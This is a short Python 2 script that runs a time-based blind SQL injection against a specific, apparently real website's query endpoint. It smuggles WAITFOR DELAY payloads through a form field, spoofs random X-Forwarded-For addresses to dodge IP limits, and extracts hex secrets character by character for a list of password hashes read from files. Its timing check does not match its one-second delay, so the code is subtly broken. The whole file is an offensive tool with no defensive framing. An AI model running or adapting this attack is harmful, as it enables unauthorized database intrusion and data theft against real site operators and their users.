import requests
import time
import random

url='http://www.iuka.cn/chaxun'

def time_inject(pos,sign, num,pwd):
	con="123';if(ascii(substring((select/**/ayanquan/**/from/**/ayname/**/where/**/aypassword='{}'),{},1))){}{}/**/WAITFOR/**/DELAY/**/'0:0:1'-- ".format(pwd,pos,sign,num)
	data={
		'con':con,
		'act':'cha'
	}
	headers={
	'X-Forwarded-For':'.'.join([str(random.randint(1,255)),str(random.randint(1,255)),str(random.randint(1,255)),str(random.randint(1,255))])
	}
	t1=time.time()
	r=requests.post(url,data=data,headers=headers)
	t2=time.time()
	if((t2-t1)>3):
		return True
	else:
		return False

def get_secret(pwd):
	s='0123456789abcdef'
	db=''
	while (len(db)<32):
		min,max=0,len(s)
		while min<=max:
			mid=(max+min)/2
			if(time_inject(len(db)+1,'=',ord(s[mid]),pwd)):
				db=db+s[mid]
				print db
				break
			if(time_inject(len(db)+1,'>',ord(s[mid]),pwd)):
				min=mid+1
			else:
				max=mid-1
				
print get_secret('dc483e80a7a0bd9ef71d8cf973673924')
'''
if __name__=='__main__':
	f=open('/root/aypassword.txt','r')
	pwd_list=f.read()[2:-2].split("', '")
	f.close()
	f1=open('/root/ayanquan.txt','w')
	for pwd in pwd_list:
		f1.write(get_secret(pwd)+'\n')
	f1.close()
'''
